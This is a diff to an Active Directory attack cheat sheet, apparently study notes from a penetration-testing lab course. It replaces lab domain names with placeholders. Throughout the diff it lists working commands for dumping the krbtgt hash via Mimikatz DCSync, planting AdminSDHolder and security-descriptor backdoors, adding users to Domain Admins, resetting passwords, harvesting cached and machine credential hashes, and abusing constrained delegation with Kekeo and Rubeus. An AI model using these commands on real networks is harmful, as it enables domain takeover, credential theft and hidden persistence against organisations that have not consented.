@@ -19,7 +19,7 @@
 #### Dump hashes of DC
 - Get the krbtgt hash
 ```
-Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -Computername <computername>
+Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -Computername <COMPUTERNAME>
 Invoke-Mimikatz -Command '"lsadump::dcsync /user:<DOMAIN>\krbtgt"'
 ```
 
@@ -41,12 +41,12 @@ C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain:<
 
 #### Use the DCSync feature for getting krbtgt hash. Execute with DA privileges
 ```
-Invoke-Mimikatz -Command '"lsadump::dcsync /user:<domain>\krbtgt"'
+Invoke-Mimikatz -Command '"lsadump::dcsync /user:<DOMAIN>\krbtgt"'
 ```
 
 #### Check WMI Permission
 ```
-Get-wmiobject -Class win32_operatingsystem -ComputerName <computername>
+Get-wmiobject -Class win32_operatingsystem -ComputerName <COMPUTERNAME>
 ```
 
 ## Silver ticket
@@ -143,19 +143,19 @@ Invoke-Mimikatz -Command '"misc:memssp"'
 
 #### Check if student has replication rights
 ```
-Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ? {($_.IdentityReference -match "<username>") -and (($_.ObjectType -match 'replication') -or ($_.ActiveDirectoryRights -match 'GenericAll'))}
+Get-ObjectAcl -DistinguishedName "dc=<DOMAIN>,dc=<TOP DOMAIN>" -ResolveGUIDs | ? {($_.IdentityReference -match "<username>") -and (($_.ObjectType -match 'replication') -or ($_.ActiveDirectoryRights -match 'GenericAll'))}
 ```
 
 #### Add fullcontrol permissions for a user to the adminSDHolder
 ```
-Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,dc=us,dc=techcorp,dc=local' -PrincipalIdentity <USERNAME> -Rights All -PrincipalDomain <DOMAIN> -TargetDomain <DOMAIN> -Verbose
+Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,dc=<DOMAIN>,dc=<TOP DOMAIN>' -PrincipalIdentity <USERNAME> -Rights All -PrincipalDomain <DOMAIN> -TargetDomain <DOMAIN> -Verbose
 ```
 
 #### Other interesting permissions
 ```
-Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,dc=us,dc=techcorp,dc=local' -PrincipalIdentity <USERNAME> -Rights ResetPassword -PrincipalDomain <DOMAIN> -TargetDomain <DOMAIN> -Verbose
+Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,dc=<DOMAIN>,dc=<TOP DOMAIN>' -PrincipalIdentity <USERNAME> -Rights ResetPassword -PrincipalDomain <DOMAIN> -TargetDomain <DOMAIN> -Verbose
 
-Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,dc=us,dc=techcorp,dc=local' -PrincipalIdentity <USERNAME> -Rights WriteMembers -PrincipalDomain <DOMAIN> -TargetDomain <DOMAIN> -Verbose
+Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,dc=<DOMAIN>,dc=<TOP DOMAIN>' -PrincipalIdentity <USERNAME> -Rights WriteMembers -PrincipalDomain <DOMAIN> -TargetDomain <DOMAIN> -Verbose
 ```
 
 #### Run SDProp on AD (Force the sync of AdminSDHolder)
@@ -168,12 +168,12 @@ Invoke-SDpropagator -taskname FixUpInheritance -timeoutMinutes 1 -showProgress -
 
 #### Check if user got generic all against domain admins group
 ```
-Get-ObjectAcl -SamaccountName “Domain Admins” –ResolveGUIDS | ?{$_.identityReference -match ‘<username>’}
+Get-ObjectAcl -SamaccountName "Domain Admins" –ResolveGUIDS | ?{$_.identityReference -match ‘<username>’}
 ```
 
 #### Add user to domain admin group
 ```
-Add-DomainGroupMember -Identity ‘Domain Admins’ -Members <username> -Verbose
+Add-DomainGroupMember -Identity "Domain Admins" -Members <USERNAME> -Verbose
 ```
 
 or
@@ -184,7 +184,7 @@ Net group "domain admins" sportless /add /domain
 
 #### Abuse resetpassword using powerview_dev
 ```
-Set-DomainUserPassword -Identity <username> -AccountPassword (ConvertTo-SecureString "Password@123" -AsPlainText -Force ) -Verbose
+Set-DomainUserPassword -Identity <USERNAME> -AccountPassword (ConvertTo-SecureString "Password@123" -AsPlainText -Force ) -Verbose
 ```
 
 ### DCsync
@@ -192,17 +192,17 @@ Set-DomainUserPassword -Identity <username> -AccountPassword (ConvertTo-SecureSt
 
 #### Add Full-control rights
 ```
-Add-DomainObjectAcl -TargetIdentity "dc=us,dc=techcorp,dc=local" -PrincipalIdentity <USER> -Rights All -PrincipalDomain <DOMAIN< -TargetDomain <DOMAIN> -Verbose
+Add-DomainObjectAcl -TargetIdentity "dc=<DOMAIN>,dc=<TOP DOMAIN>" -PrincipalIdentity <USER> -Rights All -PrincipalDomain <DOMAIN< -TargetDomain <DOMAIN> -Verbose
 ```
 
 #### Add rights for DCsync
 ```
-Add-DomainObjectAcl -TargetIdentity "dc=us,dc=techcorp,dc=local" -PrincipalIdentity studentuser1 -Rights DCSync -PrincipalDomain us.techcorp.local -TargetDomain us.techcorp.local -Verbose 
+Add-DomainObjectAcl -TargetIdentity "dc=<DOMAIN>,dc=<TOP DOMAIN>" -PrincipalIdentity studentuser1 -Rights DCSync -PrincipalDomain <FQDN DOMAIN> -TargetDomain <FQDN DOMAIN> -Verbose 
 ```
 
 #### Execute DCSync and dump krbtgt
 ```
-Invoke-Mimikatz -Command '"lsadump::dcsync /user:<domain>\krbtgt"'
+Invoke-Mimikatz -Command '"lsadump::dcsync /user:<DOMAIN>\krbtgt"'
 ```
 
 ### SecurityDescriptor - WMI
@@ -212,28 +212,28 @@ Invoke-Mimikatz -Command '"lsadump::dcsync /user:<domain>\krbtgt"'
 
 #### On a local machine
 ```
-Set-RemoteWMI -Username <username> -Verbose
+Set-RemoteWMI -Username <USERNAME> -Verbose
 ```
 
 #### On a remote machine without explicit credentials
 ```
-Set-RemoteWMI -Username <username> -Computername <computername> -namespace ‘root\cimv2’ -Verbose
+Set-RemoteWMI -Username <username> -Computername <COMPUTERNAME> -namespace ‘root\cimv2’ -Verbose
 ```
 
 #### On a remote machine with explicit credentials
 - Only root/cimv and nested namespaces
 ```
-Set-RemoteWMI -Username <username> -Computername <computername> -Credential Administrator -namespace ‘root\cimv2’ -Verbose
+Set-RemoteWMI -Username <username> -Computername <COMPUTERNAME> -Credential Administrator -namespace ‘root\cimv2’ -Verbose
 ```
 
 #### On remote machine remove permissions
 ```
-Set-RemoteWMI -Username <username> -Computername <computername> -namespace ‘root\cimv2’ -Remove -Verbose
+Set-RemoteWMI -Username <USERNAME> -Computername <COMPUTERNAME> -namespace ‘root\cimv2’ -Remove -Verbose
 ```
 
 #### Check WMI permissions
 ```
-Get-wmiobject -Class win32_operatingsystem -ComputerName <computername>
+Get-wmiobject -Class win32_operatingsystem -ComputerName <COMPUTERNAME>
 ```
 
 ### SecurityDescriptor - Powershell Remoting
@@ -243,17 +243,17 @@ Get-wmiobject -Class win32_operatingsystem -ComputerName <computername>
 
 #### On a local machine
 ```
-Set-RemotePSRemoting -Username <username> -Verbose
+Set-RemotePSRemoting -Username <USERNAME> -Verbose
 ```
 
 #### On a remote machine without credentials
 ```
-Set-RemotePSRemoting -Username <username> -Computername <computername> -Verbose
+Set-RemotePSRemoting -Username <USERNAME> -Computername <COMPUTERNAME> -Verbose
 ```
 
 #### On a remote machine remove permissions
 ```
-Set-RemotePSRemoting -Username <username> -Computername <computername> -Remove
+Set-RemotePSRemoting -Username <USERNAME> -Computername <COMPUTERNAME> -Remove
 ```
 
 ### SecurityDescriptor - Remote Registry
@@ -265,22 +265,22 @@ Using the DAMP toolkit
 
 #### Using DAMP with admin privs on remote machine
 ```
-Add-RemoteRegBackdoor -Computername <computername> -Trustee <username> -Verbose
+Add-RemoteRegBackdoor -Computername <COMPUTERNAME> -Trustee <USERNAME> -Verbose
 ```
 
 #### Retrieve machine account hash from local machine
 ```
-Get-RemoteMachineAccountHash -Computername <computername> -Verbose
+Get-RemoteMachineAccountHash -Computername <COMPUTERNAME> -Verbose
 ```
 
 #### Retrieve local account hash from local machine
 ```
-Get-RemoteLocalAccountHash -Computername <computername> -Verbose
+Get-RemoteLocalAccountHash -Computername <COMPUTERNAME> -Verbose
 ```
 
 #### Retrieve domain cached credentials from local machine
 ```
-Get-RemoteCachedCredential -Computername <computername> -Verbose
+Get-RemoteCachedCredential -Computername <COMPUTERNAME> -Verbose
 ```
 
 ### msDS-AllowedToDelegateTo
@@ -294,20 +294,20 @@ Get-DomainUser –TrustedToAuth
 
 #### Abuse msDS-AllowedToDelegateTo Kekeo
 ```
-kekeo# tgt::ask /user:devuser /domain:us.techcorp.local /password:Password@123!
+kekeo# tgt::ask /user:<USER> /domain:<DOMAIN> /password:Password@123!
 
-kekeo# tgs::s4u /tgt:TGT_devuser@us.techcorp.local_krbtgt~us.techcorp.local@us.techcorp.local.kirbi /user:Administrator@us.techcorp.local /service:ldap/us-dc.us.techcorp.local
+kekeo# tgs::s4u /tgt:<KIRBI FILE> /user:Administrator@<DOMAIN> /service:ldap/<FQDN DC>
 
-Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@us.techcorp.local@us.techcorp.local_ldap~us-dc.us.techcorp.local@us.techcorp.local.kirbi"'
+Invoke-Mimikatz -Command '"kerberos::ptt <KIRBI FILE>"'
 
-Invoke-Mimikatz -Command '"lsadump::dcsync /user:us\krbtgt"'
+Invoke-Mimikatz -Command '"lsadump::dcsync /user:<DOMAIN>\krbtgt"'
 ```
 
 #### Abuse Rubeus:
 ```
-Rubeus.exe hash /password:Password@123! /user:devuser /domain:us.techcorp.local
+Rubeus.exe hash /password:Password@123! /user:<USER> /domain:<DOMAIN>
 
-Rubeus.exe s4u /user:devuser /rc4:539259E25A0361EC4A227DD9894719F6 /impersonateuser:administrator /msdsspn:ldap/us-dc.us.techcorp.local /domain:us.techcorp.local /ptt
+Rubeus.exe s4u /user:<USER> /rc4:<NTLM HASH> /impersonateuser:administrator /msdsspn:ldap/<FQDN DC> /domain:<DOMAIN> /ptt
 
 C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:us\krbtgt" "exit"
 ```
